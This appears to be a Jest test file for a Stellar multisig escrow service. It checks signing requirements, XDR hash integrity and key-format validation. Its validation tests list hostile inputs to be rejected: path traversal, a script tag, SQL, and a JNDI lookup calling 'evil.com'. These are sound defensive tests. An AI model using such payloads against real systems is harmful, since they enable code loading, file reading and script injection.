/**
 * Security Tests: Multisig Validation
 *
 * Validates that the escrow's multisig configuration enforces correct
 * signing requirements and prevents unauthorized operations.
 *
 * All Stellar SDK calls are performed in-process (no network) using the SDK's
 * transaction builder and XDR encoding utilities.
 */

import type { Transaction } from '@stellar/stellar-sdk';

import {
  Keypair,
  TransactionBuilder,
  Operation,
  Networks,
  BASE_FEE,
  Asset,
} from '@stellar/stellar-sdk';
import { StellarUtil } from '../../utils/stellar.util';

// ─── Mock config & server (no network) ───────────────────────────────────────

jest.mock('../../config/stellar', () => {
  const { Keypair } = require('@stellar/stellar-sdk');
  const treasury = Keypair.random();
  const arbiter = Keypair.random();
  return {
    stellarConfig: {
      network: 'testnet',
      horizonUrl: 'https://horizon-testnet.stellar.org',
      networkPassphrase: Networks.TESTNET,
      treasury: {
        publicKey: treasury.publicKey(),
        secretKey: treasury.secret(),
      },
      arbiter: {
        publicKey: arbiter.publicKey(),
        secretKey: arbiter.secret(),
      },
      usdc: {
        code: 'USDC',
        issuer: 'GBBD47IF6LWK7P7MDEVSCWR7DPUWV3NY3DTQEVFL4NAT4AQH3ZLLFLA5',
      },
      defaults: { baseFee: '100', timeout: 180, deadlineDays: 15 },
    },
    stellarServer: { loadAccount: jest.fn(), submitTransaction: jest.fn() },
  };
});

// ─── Helpers ─────────────────────────────────────────────────────────────────

function buildSyntheticAccount(
  publicKey: string,
  sequence: string,
  signers: Array<{ key: string; weight: number }>,
  thresholds: { low: number; med: number; high: number; master: number }
) {
  return {
    id: publicKey,
    account_id: publicKey,
    sequence,
    accountId() { return this.id; },
    sequenceNumber() { return this.sequence; },
    incrementSequenceNumber() {
      this.sequence = String(BigInt(this.sequence) + 1n);
    },
    signers: signers.map(s => ({ key: s.key, weight: s.weight, type: 'ed25519_public_key' })),
    thresholds: {
      low_threshold: thresholds.low,
      med_threshold: thresholds.med,
      high_threshold: thresholds.high,
    },
    balances: [
      {
        asset_code: 'USDC',
        asset_issuer: 'GBBD47IF6LWK7P7MDEVSCWR7DPUWV3NY3DTQEVFL4NAT4AQH3ZLLFLA5',
        balance: '100.0000000',
      },
    ],
  };
}

function countValidSignatures(tx: Transaction, signers: Keypair[]): number {
  const hash = tx.hash();
  let count = 0;
  for (const signer of signers) {
    try {
      const sig = signer.sign(hash);
      const inTx = tx.signatures.some(
        (s: { signature: () => Buffer }) => s.signature().equals(sig)
      );
      if (inTx) count++;
    } catch {
      // not a valid match
    }
  }
  return count;
}

// ─── Keypairs used across tests ───────────────────────────────────────────────

const hostKeypair = Keypair.random();
const talentKeypair = Keypair.random();
const arbiterKeypair = Keypair.random();
const escrowKeypair = Keypair.random();
const unauthKeypair = Keypair.random();

const usdcAsset = new Asset(
  'USDC',
  'GBBD47IF6LWK7P7MDEVSCWR7DPUWV3NY3DTQEVFL4NAT4AQH3ZLLFLA5'
);

// ─── Tests ────────────────────────────────────────────────────────────────────

describe('Security: Multisig Validation', () => {
  // ─── Keypair security ────────────────────────────────────────────────────────

  describe('Keypair security', () => {
    it('public key derived from secret should be deterministic', () => {
      const kp = Keypair.random();
      const kp2 = Keypair.fromSecret(kp.secret());
      expect(kp2.publicKey()).toBe(kp.publicKey());
    });

    it('signing with one keypair should not verify with another', () => {
      const kp1 = Keypair.random();
      const kp2 = Keypair.random();
      const data = Buffer.from('test-payload');
      const sig = kp1.sign(data);
      expect(() => kp2.verify(data, sig)).not.toThrow();
      expect(kp2.verify(data, sig)).toBe(false);
    });

    it('the same keypair always produces the same signature for the same data', () => {
      const kp = Keypair.random();
      const data = Buffer.from('deterministic');
      const sig1 = kp.sign(data);
      const sig2 = kp.sign(data);
      expect(sig1).toEqual(sig2);
    });

    it('different data produces different signatures', () => {
      const kp = Keypair.random();
      const sig1 = kp.sign(Buffer.from('payload-a'));
      const sig2 = kp.sign(Buffer.from('payload-b'));
      expect(sig1).not.toEqual(sig2);
    });
  });

  // ─── Transaction signature count ─────────────────────────────────────────────

  describe('Transaction signing requirements', () => {
    let baseTx: Transaction;
    let escrowAccount: ReturnType<typeof buildSyntheticAccount>;

    beforeEach(() => {
      escrowAccount = buildSyntheticAccount(
        escrowKeypair.publicKey(),
        '100000000',
        [
          { key: escrowKeypair.publicKey(), weight: 1 },
          { key: hostKeypair.publicKey(), weight: 1 },
          { key: talentKeypair.publicKey(), weight: 1 },
          { key: arbiterKeypair.publicKey(), weight: 1 },
        ],
        { low: 0, med: 2, high: 2, master: 1 }
      );

      baseTx = new TransactionBuilder(escrowAccount as any, {
        fee: BASE_FEE,
        networkPassphrase: Networks.TESTNET,
      })
        .addOperation(
          Operation.payment({
            destination: talentKeypair.publicKey(),
            asset: usdcAsset,
            amount: '50',
          })
        )
        .setTimeout(30)
        .build();
    });

    it('a transaction signed by only 1 party should have 1 signature', () => {
      baseTx.sign(hostKeypair);
      expect(baseTx.signatures).toHaveLength(1);
    });

    it('a transaction signed by 2 parties should have 2 signatures', () => {
      baseTx.sign(hostKeypair);
      baseTx.sign(talentKeypair);
      expect(baseTx.signatures).toHaveLength(2);
    });

    it('a transaction signed by 3 parties should have 3 signatures', () => {
      baseTx.sign(hostKeypair);
      baseTx.sign(talentKeypair);
      baseTx.sign(arbiterKeypair);
      expect(baseTx.signatures).toHaveLength(3);
    });

    it('medium threshold (2) requires at least 2 valid signatures', () => {
      baseTx.sign(hostKeypair);
      baseTx.sign(talentKeypair);

      const validCount = countValidSignatures(baseTx, [
        hostKeypair,
        talentKeypair,
        arbiterKeypair,
      ]);
      expect(validCount).toBeGreaterThanOrEqual(2);
    });

    it('an unauthorized signer should not add a valid counted signature', () => {
      baseTx.sign(unauthKeypair);

      const validCount = countValidSignatures(baseTx, [
        hostKeypair,
        talentKeypair,
        arbiterKeypair,
      ]);
      expect(validCount).toBe(0);
    });
  });

  // ─── XDR immutability ────────────────────────────────────────────────────────

  describe('XDR integrity', () => {
    it('modifying a payment amount changes the transaction hash', () => {
      const account = buildSyntheticAccount(
        escrowKeypair.publicKey(),
        '200000000',
        [{ key: escrowKeypair.publicKey(), weight: 1 }],
        { low: 0, med: 1, high: 1, master: 1 }
      );

      const buildTx = (amount: string): Transaction =>
        new TransactionBuilder(account as any, {
          fee: BASE_FEE,
          networkPassphrase: Networks.TESTNET,
        })
          .addOperation(
            Operation.payment({
              destination: talentKeypair.publicKey(),
              asset: usdcAsset,
              amount,
            })
          )
          .setTimeout(30)
          .build();

      const tx50 = buildTx('50');
      account.incrementSequenceNumber();
      const tx100 = buildTx('100');

      expect(tx50.hash().toString('hex')).not.toBe(tx100.hash().toString('hex'));
    });

    it('same transaction parameters produce the same hash', () => {
      const account = buildSyntheticAccount(
        escrowKeypair.publicKey(),
        '300000000',
        [{ key: escrowKeypair.publicKey(), weight: 1 }],
        { low: 0, med: 1, high: 1, master: 1 }
      );

      const tx1 = new TransactionBuilder(account as any, {
        fee: BASE_FEE,
        networkPassphrase: Networks.TESTNET,
      })
        .addOperation(
          Operation.payment({
            destination: talentKeypair.publicKey(),
            asset: usdcAsset,
            amount: '75',
          })
        )
        .setTimeout(0)
        .build();

      const tx2 = TransactionBuilder.fromXDR(tx1.toXDR(), Networks.TESTNET);
      expect(tx1.hash().toString('hex')).toBe(tx2.hash().toString('hex'));
    });

    it('XDR round-trip preserves transaction structure', () => {
      const account = buildSyntheticAccount(
        escrowKeypair.publicKey(),
        '400000000',
        [{ key: escrowKeypair.publicKey(), weight: 1 }],
        { low: 0, med: 1, high: 1, master: 1 }
      );

      const original = new TransactionBuilder(account as any, {
        fee: BASE_FEE,
        networkPassphrase: Networks.TESTNET,
      })
        .addOperation(
          Operation.payment({
            destination: talentKeypair.publicKey(),
            asset: usdcAsset,
            amount: '10',
          })
        )
        .setTimeout(30)
        .build();

      original.sign(escrowKeypair);

      const restored = TransactionBuilder.fromXDR(original.toXDR(), Networks.TESTNET);

      expect(restored.hash().toString('hex')).toBe(
        original.hash().toString('hex')
      );
      expect(restored.signatures).toHaveLength(original.signatures.length);
    });
  });

  // ─── isValidPublicKey / isValidSecretKey guards ────────────────────────────

  describe('Key validation as security boundary', () => {
    it('should reject injection patterns as public keys', () => {
      const dangerousInputs = [
        '../../etc/passwd',
        '<script>alert(1)</script>',
        'SELECT * FROM users',
        '\0null-byte',
        'G' + 'A'.repeat(200),
      ];
      dangerousInputs.forEach(input => {
        expect(StellarUtil.isValidPublicKey(input)).toBe(false);
      });
    });

    it('should reject injection patterns as secret keys', () => {
      const dangerousInputs = [
        'S/../../../../../etc',
        '${jndi:ldap://evil.com/a}',
        'S' + '\n'.repeat(5) + 'injection',
      ];
      dangerousInputs.forEach(input => {
        expect(StellarUtil.isValidSecretKey(input)).toBe(false);
      });
    });

    it('getTreasuryKeypair should throw when secret is missing', () => {
      const { stellarConfig } = require('../../config/stellar');
      const original = stellarConfig.treasury.secretKey;
      stellarConfig.treasury.secretKey = '';

      expect(() => StellarUtil.getTreasuryKeypair()).toThrow(
        /STELLAR_TREASURY_SECRET_KEY not configured/
      );

      stellarConfig.treasury.secretKey = original;
    });

    it('getArbiterKeypair should throw when secret is missing', () => {
      const { stellarConfig } = require('../../config/stellar');
      const original = stellarConfig.arbiter.secretKey;
      stellarConfig.arbiter.secretKey = '';

      expect(() => StellarUtil.getArbiterKeypair()).toThrow(
        /STELLAR_ARBITER_SECRET_KEY not configured/
      );

      stellarConfig.arbiter.secretKey = original;
    });
  });
});
